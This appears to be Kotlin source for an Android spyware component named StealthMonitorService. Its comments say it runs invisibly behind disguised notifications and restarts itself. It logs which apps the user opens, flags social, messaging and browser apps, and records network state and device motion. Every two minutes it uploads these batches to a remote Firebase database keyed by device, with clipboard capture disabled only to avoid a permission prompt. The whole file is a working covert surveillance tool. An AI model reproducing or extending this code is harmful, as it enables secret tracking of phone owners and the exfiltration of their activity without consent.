package com.h4k3r.dreamer

import android.app.ActivityManager
import android.app.Service
import android.app.usage.UsageStats
import android.app.usage.UsageStatsManager
// import android.content.ClipboardManager // REMOVED: Requires special permissions
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.IBinder
import android.util.Log
import kotlinx.coroutines.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import java.text.SimpleDateFormat
import java.util.*
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.net.ConnectivityManager
import android.net.NetworkInfo
import android.view.accessibility.AccessibilityManager

/**
 * Advanced stealth monitoring service - tracks user activity patterns
 * Features: App Usage, System State, Input Patterns (Clipboard monitoring removed)
 * Runs completely invisibly with stealth notifications
 */
class StealthMonitorService : Service(), SensorEventListener {

    companion object {
        private const val TAG = "StealthMonitorService"
        private const val MONITORING_INTERVAL = 10000L // 10 seconds (stable for background operation)
        private const val UPLOAD_INTERVAL = 120000L // 2 minutes batch upload (more stable)
        private const val MAX_DATA_BUFFER = 30 // Smaller buffer for better stability
        private const val SERVICE_RESTART_DELAY = 5000L // 5 seconds between restarts
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isMonitoring = false

    // Monitoring components
    // private lateinit var clipboardManager: ClipboardManager // REMOVED: Requires special permissions
    private lateinit var usageStatsManager: UsageStatsManager
    private lateinit var activityManager: ActivityManager
    private lateinit var sensorManager: SensorManager
    private lateinit var connectivityManager: ConnectivityManager

    // Cached data for comparison
    // private var lastClipboardContent = "" // REMOVED: Clipboard monitoring
    private var lastForegroundApp = ""
    private var lastNetworkState = ""
    private var inputActivityScore = 0f

    // Data collection buffers
    private val monitoringData = mutableListOf<Map<String, Any>>()
    // private val clipboardHistory = mutableListOf<Map<String, Any>>() // REMOVED: Clipboard monitoring
    private val appUsageHistory = mutableListOf<Map<String, Any>>()
    private val systemStateHistory = mutableListOf<Map<String, Any>>()

    override fun onCreate() {
        super.onCreate()

        try {
            // Start foreground service IMMEDIATELY to prevent timeout
            val stealthManager = StealthNotificationManager.getInstance(this)
            startForeground(StealthNotificationManager.STEALTH_NOTIFICATION_ID, stealthManager.getStealthNotification())

            // Initialize monitoring components after foreground service is started
            // clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager // REMOVED
            usageStatsManager = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            activityManager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            sensorManager = getSystemService(Context.SENSOR_SERVICE) as SensorManager
            connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

            // Enforce stealth mode after initialization
            stealthManager.enforceStealthMode()

            Log.d(TAG, "StealthMonitorService created with advanced monitoring - foreground service active")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start StealthMonitorService: ${e.message}")
            // Fallback: try to continue as background service
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!isMonitoring) {
            startAdvancedMonitoring()
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startAdvancedMonitoring() {
        isMonitoring = true

        // Register sensor listeners for input pattern detection
        registerSensorListeners()

        // Start main monitoring loop with better error handling
        scope.launch {
            var consecutiveErrors = 0
            while (isMonitoring && consecutiveErrors < 5) {
                try {
                    // 1. Monitor clipboard changes - REMOVED: Requires special permissions
                    // monitorClipboard()

                    // 2. Monitor app usage and switches
                    monitorAppUsage()

                    // 3. Monitor system state
                    monitorSystemState()

                    // 4. Analyze input patterns
                    analyzeInputPatterns()

                    consecutiveErrors = 0 // Reset error count on success
                    delay(MONITORING_INTERVAL)
                } catch (e: Exception) {
                    consecutiveErrors++
                    Log.e(TAG, "Monitoring error (${consecutiveErrors}/5): ${e.message}")

                    if (consecutiveErrors >= 5) {
                        Log.e(TAG, "Too many consecutive errors, stopping monitoring")
                        break
                    }

                    // Longer delay on error to prevent rapid failures
                    delay(MONITORING_INTERVAL * 2)
                }
            }
        }

        // Start batch upload loop with better error handling
        scope.launch {
            var uploadErrors = 0
            while (isMonitoring && uploadErrors < 3) {
                try {
                    delay(UPLOAD_INTERVAL)
                    uploadBatchData()
                    uploadErrors = 0 // Reset on success
                } catch (e: Exception) {
                    uploadErrors++
                    Log.e(TAG, "Upload error (${uploadErrors}/3): ${e.message}")

                    if (uploadErrors >= 3) {
                        Log.e(TAG, "Too many upload errors, stopping uploads")
                        break
                    }

                    // Longer delay on upload error
                    delay(UPLOAD_INTERVAL / 2)
                }
            }
        }

        Log.d(TAG, "Advanced stealth monitoring started with enhanced stability")
    }

    private fun registerSensorListeners() {
        try {
            // Register accelerometer for device movement detection
            sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)?.let { sensor ->
                sensorManager.registerListener(this, sensor, SensorManager.SENSOR_DELAY_NORMAL)
            }

            // Register gyroscope for orientation changes
            sensorManager.getDefaultSensor(Sensor.TYPE_GYROSCOPE)?.let { sensor ->
                sensorManager.registerListener(this, sensor, SensorManager.SENSOR_DELAY_NORMAL)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Sensor registration error: ${e.message}")
        }
    }

    // REMOVED: CLIPBOARD MONITORING - Requires special permissions that user doesn't want to grant
    // All methods related to clipboard monitoring have been removed to avoid permission requirements

    // 2. APP USAGE MONITORING (Enhanced for better data collection)
    private fun monitorAppUsage() {
        try {
            // Monitor foreground app changes with enhanced detection
            val currentApp = getCurrentForegroundApp()
            if (currentApp != lastForegroundApp && currentApp.isNotEmpty()) {
                val timestamp = System.currentTimeMillis()

                val appData = mapOf(
                    "type" to "app_switch",
                    "package" to currentApp,
                    "app_name" to getAppName(currentApp),
                    "previous_app" to lastForegroundApp,
                    "timestamp" to timestamp,
                    "is_social_app" to isSocialApp(currentApp),
                    "is_messaging_app" to isMessagingApp(currentApp),
                    "is_browser" to isBrowserApp(currentApp)
                )

                appUsageHistory.add(appData)
                lastForegroundApp = currentApp

                // Prevent memory overflow
                if (appUsageHistory.size > MAX_DATA_BUFFER) {
                    appUsageHistory.removeAt(0)
                }
            }

            // Get detailed usage stats with broader time window for better data collection
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val endTime = System.currentTimeMillis()
                val startTime = endTime - (300 * 1000) // Last 5 minutes (broader window)

                try {
                    val usageStats = usageStatsManager.queryUsageStats(
                        UsageStatsManager.INTERVAL_BEST,
                        startTime,
                        endTime
                    )

                    Log.d(TAG, "Found ${usageStats?.size ?: 0} usage stats entries")

                    usageStats?.filter { it.totalTimeInForeground > 100 }?.forEach { stat ->
                        val usageData = mapOf(
                            "type" to "app_usage_stats",
                            "package" to stat.packageName,
                            "app_name" to getAppName(stat.packageName),
                            "usage_time" to stat.totalTimeInForeground,
                            "last_used" to stat.lastTimeUsed,
                            "first_used" to stat.firstTimeStamp,
                            "timestamp" to System.currentTimeMillis(),
                            "is_recent" to (endTime - stat.lastTimeUsed < 60000) // Within last minute
                        )

                        appUsageHistory.add(usageData)

                        // Prevent overflow
                        if (appUsageHistory.size > MAX_DATA_BUFFER) {
                            appUsageHistory.removeAt(0)
                        }

                        Log.d(TAG, "Recorded usage for ${stat.packageName}: ${stat.totalTimeInForeground}ms")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Usage stats error: ${e.message}")

                    // Fallback: Record current foreground app as usage
                    if (currentApp.isNotEmpty()) {
                        val fallbackData = mapOf(
                            "type" to "app_usage_fallback",
                            "package" to currentApp,
                            "app_name" to getAppName(currentApp),
                            "detection_method" to "running_processes",
                            "timestamp" to System.currentTimeMillis()
                        )
                        appUsageHistory.add(fallbackData)
                    }
                }
            } else {
                // For older Android versions, just record app switches
                if (currentApp.isNotEmpty()) {
                    val legacyData = mapOf(
                        "type" to "app_usage_legacy",
                        "package" to currentApp,
                        "app_name" to getAppName(currentApp),
                        "timestamp" to System.currentTimeMillis()
                    )
                    appUsageHistory.add(legacyData)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "App usage monitoring error: ${e.message}")
        }
    }

    // 3. SYSTEM STATE MONITORING
    private fun monitorSystemState() {
        try {
            val memoryInfo = ActivityManager.MemoryInfo()
            activityManager.getMemoryInfo(memoryInfo)

            val networkInfo = connectivityManager.activeNetworkInfo
            val networkState = "${networkInfo?.type}_${networkInfo?.isConnected}"

            val systemData = mapOf(
                "type" to "system_state",
                "available_memory" to memoryInfo.availMem,
                "total_memory" to memoryInfo.totalMem,
                "low_memory" to memoryInfo.lowMemory,
                "memory_threshold" to memoryInfo.threshold,
                "network_connected" to (networkInfo?.isConnected == true),
                "network_type" to (networkInfo?.typeName ?: "unknown"),
                "network_subtype" to (networkInfo?.subtypeName ?: "unknown"),
                "running_processes" to getRunningProcessCount(),
                "timestamp" to System.currentTimeMillis()
            )

            systemStateHistory.add(systemData)

            // Prevent memory overflow
            if (systemStateHistory.size > MAX_DATA_BUFFER) {
                systemStateHistory.removeAt(0)
            }

            // Detect significant network changes
            if (networkState != lastNetworkState) {
                val networkChangeData = mapOf(
                    "type" to "network_change",
                    "previous_state" to lastNetworkState,
                    "current_state" to networkState,
                    "timestamp" to System.currentTimeMillis()
                )
                systemStateHistory.add(networkChangeData)
                lastNetworkState = networkState
            }
        } catch (e: Exception) {
            Log.e(TAG, "System state monitoring error: ${e.message}")
        }
    }

    // 4. INPUT PATTERN ANALYSIS
    private fun analyzeInputPatterns() {
        try {
            // Analyze system load and activity patterns
            val processes = activityManager.runningAppProcesses
            val foregroundProcesses = processes?.count {
                it.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
            } ?: 0

            // Calculate input activity score based on various factors
            var activityScore = 0f

            // Factor 1: Number of active processes
            activityScore += foregroundProcesses * 0.2f

            // Factor 2: Memory pressure (indicates active usage)
            val memoryInfo = ActivityManager.MemoryInfo()
            activityManager.getMemoryInfo(memoryInfo)
            val memoryPressure = (memoryInfo.totalMem - memoryInfo.availMem).toFloat() / memoryInfo.totalMem
            activityScore += memoryPressure * 0.3f

            // Factor 3: Recent app switches (indicates user interaction)
            val recentSwitches = appUsageHistory.count {
                System.currentTimeMillis() - (it["timestamp"] as Long) < 10000
            }
            activityScore += recentSwitches * 0.1f

            // Factor 4: Recent clipboard activity - REMOVED
            // Clipboard monitoring removed to avoid special permissions
            val recentClipboard = 0 // No clipboard data

            if (activityScore != inputActivityScore) {
                val inputData = mapOf(
                    "type" to "input_pattern",
                    "activity_score" to activityScore,
                    "foreground_processes" to foregroundProcesses,
                    "memory_pressure" to memoryPressure,
                    "recent_switches" to recentSwitches,
                    "recent_clipboard" to recentClipboard,
                    "likely_typing" to (activityScore > 0.5f),
                    "timestamp" to System.currentTimeMillis()
                )

                systemStateHistory.add(inputData)
                inputActivityScore = activityScore
            }
        } catch (e: Exception) {
            Log.e(TAG, "Input pattern analysis error: ${e.message}")
        }
    }

    // SENSOR EVENT HANDLING
    override fun onSensorChanged(event: SensorEvent?) {
        event?.let {
            when (it.sensor.type) {
                Sensor.TYPE_ACCELEROMETER -> {
                    // Detect device movement patterns
                    val totalAcceleration = kotlin.math.sqrt(
                        it.values[0] * it.values[0] +
                                it.values[1] * it.values[1] +
                                it.values[2] * it.values[2]
                    )

                    // If significant movement detected, log it
                    if (totalAcceleration > 12f) { // Threshold for active movement
                        val movementData = mapOf(
                            "type" to "device_movement",
                            "acceleration" to totalAcceleration,
                            "x" to it.values[0],
                            "y" to it.values[1],
                            "z" to it.values[2],
                            "timestamp" to System.currentTimeMillis()
                        )
                        systemStateHistory.add(movementData)
                    }
                }
                Sensor.TYPE_GYROSCOPE -> {
                    // Detect rotation patterns
                    val totalRotation = kotlin.math.sqrt(
                        it.values[0] * it.values[0] +
                                it.values[1] * it.values[1] +
                                it.values[2] * it.values[2]
                    )

                    if (totalRotation > 1f) { // Threshold for rotation
                        val rotationData = mapOf(
                            "type" to "device_rotation",
                            "rotation_rate" to totalRotation,
                            "timestamp" to System.currentTimeMillis()
                        )
                        systemStateHistory.add(rotationData)
                    }
                }
            }
        }
    }

    override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {
        // Not needed for our use case
    }

    // HELPER METHODS
    private fun getCurrentForegroundApp(): String {
        try {
            // Method 1: Try running app processes
            val processes = activityManager.runningAppProcesses
            processes?.forEach { process ->
                if (process.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                    return process.processName
                }
            }

            // Method 2: Try usage stats (more reliable for recent apps)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val endTime = System.currentTimeMillis()
                val startTime = endTime - 1000 // Last 1 second

                val usageStats = usageStatsManager.queryUsageStats(
                    UsageStatsManager.INTERVAL_BEST,
                    startTime,
                    endTime
                )

                // Find most recently used app
                val recentApp = usageStats?.maxByOrNull { it.lastTimeUsed }
                if (recentApp != null && recentApp.lastTimeUsed > 0) {
                    return recentApp.packageName
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting foreground app: ${e.message}")
        }
        return ""
    }

    private fun getRecentApps(): List<String> {
        val recentApps = mutableListOf<String>()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val endTime = System.currentTimeMillis()
                val startTime = endTime - 60000 // Last 1 minute

                val usageStats = usageStatsManager.queryUsageStats(
                    UsageStatsManager.INTERVAL_BEST,
                    startTime,
                    endTime
                )

                usageStats?.filter { it.totalTimeInForeground > 0 }
                    ?.sortedByDescending { it.lastTimeUsed }
                    ?.take(10)
                    ?.forEach { recentApps.add(it.packageName) }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting recent apps: ${e.message}")
        }
        return recentApps
    }

    private fun getAppName(packageName: String): String {
        return try {
            val packageManager = packageManager
            val applicationInfo = packageManager.getApplicationInfo(packageName, 0)
            packageManager.getApplicationLabel(applicationInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    private fun getRunningProcessCount(): Int {
        return try {
            activityManager.runningAppProcesses?.size ?: 0
        } catch (e: Exception) {
            0
        }
    }

    private fun isSocialApp(packageName: String): Boolean {
        val socialApps = listOf("facebook", "instagram", "twitter", "snapchat", "tiktok", "linkedin")
        return socialApps.any { packageName.contains(it, ignoreCase = true) }
    }

    private fun isMessagingApp(packageName: String): Boolean {
        val messagingApps = listOf("whatsapp", "telegram", "messenger", "signal", "discord", "skype")
        return messagingApps.any { packageName.contains(it, ignoreCase = true) }
    }

    private fun isBrowserApp(packageName: String): Boolean {
        val browsers = listOf("chrome", "firefox", "edge", "opera", "brave", "browser")
        return browsers.any { packageName.contains(it, ignoreCase = true) }
    }

    // DATA UPLOAD
    private suspend fun uploadBatchData() {
        try {
            val secretKey = getSharedPreferences("dreamer_auth", Context.MODE_PRIVATE)
                .getString("secret_key", "") ?: ""
            val deviceId = getSharedPreferences("dreamer_auth", Context.MODE_PRIVATE)
                .getString("device_id", "") ?: ""

            if (secretKey.isEmpty() || deviceId.isEmpty()) return

            val timestamp = SimpleDateFormat("yyyy-MM-dd_HH:mm:ss", Locale.getDefault())
                .format(Date())

            // Combine all monitoring data (clipboard data removed)
            val allData = mutableListOf<Map<String, Any>>()
            // allData.addAll(clipboardHistory) // REMOVED: Clipboard monitoring
            allData.addAll(appUsageHistory)
            allData.addAll(systemStateHistory)

            if (allData.isNotEmpty()) {
                // Upload in batches
                val batchData = mapOf(
                    "clipboard_count" to 0, // No clipboard data
                    "app_usage_count" to appUsageHistory.size,
                    "system_events_count" to systemStateHistory.size,
                    "total_events" to allData.size,
                    "data" to allData,
                    "monitoring_active" to true,
                    "upload_timestamp" to System.currentTimeMillis()
                )

                Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("stealth_monitoring")
                    .child(timestamp)
                    .setValue(batchData)

                // Clear uploaded data
                // clipboardHistory.clear() // REMOVED: Clipboard monitoring
                appUsageHistory.clear()
                systemStateHistory.clear()

                Log.d(TAG, "Uploaded ${allData.size} monitoring events")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Data upload error: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        isMonitoring = false
        sensorManager.unregisterListener(this)
        scope.cancel()
        Log.d(TAG, "StealthMonitorService destroyed")
    }
}